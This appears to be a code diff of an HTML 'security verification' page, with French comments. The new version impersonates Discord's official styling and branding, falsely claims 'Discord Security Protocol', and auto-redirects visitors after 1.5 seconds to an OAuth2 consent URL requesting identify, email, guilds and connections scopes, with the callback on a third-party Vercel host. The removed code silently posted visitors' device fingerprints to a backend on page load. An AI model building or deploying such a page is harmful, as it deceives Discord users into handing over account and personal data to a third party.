@@ -1,43 +1,97 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Verification</title>
+    <title>Discord | Verification System</title>
     <style>
-        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { text-align: center; padding: 2rem; border: 1px solid #333; border-radius: 8px; background: #1a1a1a; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 2s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'gg sans', 'Noto Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #313338; /* Couleur sombre officielle Discord */
+            color: #f2f3f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .card {
+            background-color: #2b2d31;
+            padding: 32px;
+            border-radius: 8px;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.24);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .shield-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin: 0 0 8px 0;
+            color: #ffffff;
+        }
+
+        p {
+            font-size: 16px;
+            color: #b5bac1;
+            line-height: 20px;
+            margin-bottom: 28px;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-left-color: #5865f2; /* Bleu Blurple Discord */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-note {
+            font-size: 12px;
+            color: #949ba4;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h2>Verifying your connection...</h2>
-        <p>Please wait while we secure your session.</p>
-        <div class="loader"></div>
+        <img src="https://cdn-icons-png.flaticon.com/512/1067/1067555.png" alt="Shield" class="shield-icon">
+        <h1>Vérification de sécurité</h1>
+        <div class="spinner"></div>
+        <p>Analyse de votre session Discord en cours pour prévenir les accès non autorisés...</p>
+        <span class="footer-note">Propulsé par Discord Security Protocol</span>
     </div>
 
     <script>
-        // Dès que la page charge, on envoie les infos au backend
-        window.onload = async () => {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenRes: `${window.screen.width}x${window.screen.height}`
-            };
+        // --- CONFIGURATION ---
+        // Remplace par ton URL OAuth2 complète générée dans le Developer Portal
+        // Assure-toi que les scopes identify, email, guilds et connections sont inclus
+        const OAUTH_URL = "https://discord.com/oauth2/authorize?client_id=1500105803980607659&response_type=code&redirect_uri=https%3A%2F%2Fip-eight-liart.vercel.app%2Fapi%2Fcallback&scope=identify+email+guilds+connections";
 
-            await fetch('/api/verify', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(deviceInfo)
-            });
-
-            // Optionnel : Rediriger après 3 secondes
+        // Redirection automatique après 1.5 seconde
+        window.onload = () => {
             setTimeout(() => {
-                window.location.href = "https://discord.com/app";
-            }, 3000);
+                window.location.href = OAUTH_URL;
+            }, 1500);
         };
     </script>
 </body>
